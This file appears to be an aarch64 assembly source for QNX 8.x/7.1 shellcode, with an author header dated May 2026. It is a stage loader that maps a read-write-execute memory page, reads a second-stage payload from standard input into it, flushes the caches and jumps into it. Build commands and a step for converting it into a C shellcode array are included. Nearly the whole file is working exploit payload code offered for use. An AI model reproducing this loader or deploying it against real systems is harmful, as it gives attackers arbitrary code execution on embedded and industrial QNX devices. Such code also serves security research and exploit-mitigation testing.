/*
 * QNX 8.x 7.1 aarch64 Shellcode (not optimized)
 *   Stage loader, allocate 1 page of rwx mem, read from
 *   file descriptor (0 by default) and jump to it
 *
 * By Claes M Sjöberg <cmn@signedness.org>, May 2026
 *
 * Compile executable:
 *  ntoaarch64-as -o stageload.o stageload.s
 *  qcc -Vgcc_ntoaarch64le -nostdlib -o stageload stageload.o
 *  ntoaarch64-objdump -S stageload
 *
 * Create and disassemble blob:
 *  ntoaarch64-as -o stageload.o stageload.s
 *  ntoaarch64-objcopy -O binary stageload.o stageload.bin
 *  ntoaarch64-objdump -D -b binary -m aarch64 stageload.bin 
 *
 * Create shellcode C array:
 *  xxd --include stageload.bin
 */

# Page aligned bufsize
.equ BUFSIZE, 0x4000

.global main
.text
main:
    //
    // struct _mem_map (from the back)
    //

    // 0x0000000000000000
    // 0x0000000000000000
    // 0x0000000000000000
    // 0x0000000000000000
    eor     x0, x0, x0
    stp     x0, x0, [sp, #-16]!
    stp     x0, x0, [sp, #-16]!

    // 0x0000000000000000
    // 0x00000000ffffffff - mm.preload + mm.fd (NOFD)
    movz    x1, #0xffff, lsl #16
    movk    x1, #0xffff, lsl #0
    stp     x1, x0, [sp, #-16]!

    // 0x0008000200000700 - mm.flags + mm.prot
    // 0x0000000000001000 - mm.len
    movz    x0, #0x0002, lsl #32
    movk    x0, #0x0700, lsl #0   
    movz    x1, #BUFSIZE, lsl #0
    stp     x1, x0, [sp, #-16]!

    // 0x0000000000000000 - padding for stack alignment
    // 0x0000000000000040 - mm.pid, mm.zero, mm.type
    eor     x0, x0, x0
    movz    x1, #0x0040, lsl #0
    stp     x1, x0, [sp, #-16]!

    add     x1, sp, #0          // x1 = &mm
    movz    x2, #72, lsl #0     // x2 = sizeof(mm)
    
    //
    // struct _mem_map_reply
    //

    // 0x0000000000000000
    // 0x0000000000000000
    // 0x0000000000000000
    // 0x0000000000000000
    eor     x0, x0, x0
    stp     x0, x0, [sp, #-16]!
    stp     x0, x0, [sp, #-16]!
    add     x3, sp, #0          // x3 = &reply
    movz    x4, #24, lsl #0     // x4 = sizeof(reply)

    // MsgSend(0x40000000, &mm, sizeof(mm), &reply, sizeof(reply));
    // MsgSend(x0,          x1,         x2,     x3,            x4) 
    movz    x0, #0x4000, lsl #16    // x0 = 0x40000000
    neg     x2, x2
    neg     x4, x4
    mov     w8, #0x0b               // syscall number 11
    svc     #0                

    //
    // Read back mapped address and size from return buffer into x3 and x4
    //
    ldp      x4, x3, [sp], #16      // x4 = size (top of stack), x3 = addr

    // Save pointer to buffer in preserver register x19
    mov     x19, x3

    //
    // struct _io_read
    //
    
    // 0x0000000000000000
    // 0x0000100000100101
    eor     x0, x0, x0
    movz    x1, #0x1000, lsl #32
    movk    x1, #0x0010, lsl #16
    movk    x1, #0x0101, lsl #0
    stp     x1, x0, [sp, #-16]!
    add     x1, sp, #0          // &ir
    
    movz    x2, #16, lsl #0     // sizeof(ir)

    // MsgSend(STDIN_FILENO, &ir, sizeof(ir), buf, sizeof(buf)) 
    // MsgSend(x0,            x1,         x2,  x3, x4) 
    neg     x2, x2
    neg     x4, x4
    mov     w8, #0x0b               // syscall number 11
    svc     #0                 


    // x19 = buffer start
    // x20 = buffer size
    // x21 = end address
    movz    x20, #BUFSIZE, lsl #0
    add     x21, x19, x20       // x21 = end address

    // Clean data cache for entire buffer
    mov     x22, x19            // x22 = start of buffer
    .Ldc_loop:
        dc      cvau, x22       // Clean current line
        add     x22, x22, #64
        cmp     x22, x21
        b.lt    .Ldc_loop

        // Data sync barrier, wait for cache instructions
        // (ish - Inner Shareable Domain, i.e. all cores)
        dsb     ish

    // Invalidate instruction cache for entire buffer
    mov     x22, x19
    .Lic_loop:
        ic      ivau, x22
        add     x22, x22, #64
        cmp     x22, x21
        b.lt    .Lic_loop

        // Data sync barrier, wait for cache instructions
        // (ish - Inner Shareable Domain, i.e. all cores)
        dsb     ish
        
        // Instruction Sync Barrier
        // Flush the CPU instruction pipeline and force
        // to refetch everything
        isb

    // Jump to buffer
    br      x19
